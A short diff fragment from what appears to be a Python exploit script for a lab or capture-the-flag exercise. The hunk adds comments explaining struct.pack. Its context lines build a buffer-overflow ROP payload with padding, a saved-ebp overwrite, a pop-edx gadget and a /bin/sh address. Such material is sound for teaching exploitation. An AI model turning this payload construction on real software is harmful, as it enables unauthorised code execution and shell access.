@@ -981,6 +981,10 @@ pop_edx     = lib_base + 0x00001aa2
 binsh_loc   = 0x556ee84c
 null_val    = '\x00\x00\x00\x00'
 
+#struct pack returns a string containing values packed in a certain format
+#'<I' makes them little endian unsigned int's
+#see here for more details https://docs.python.org/2/library/struct.html
+
 p = 'a'*76    #fill buffer          #build our stack
 p += 'bbbb'    #overflow ebp
 p += pack('<I', pop_edx)    #pop edx; ret
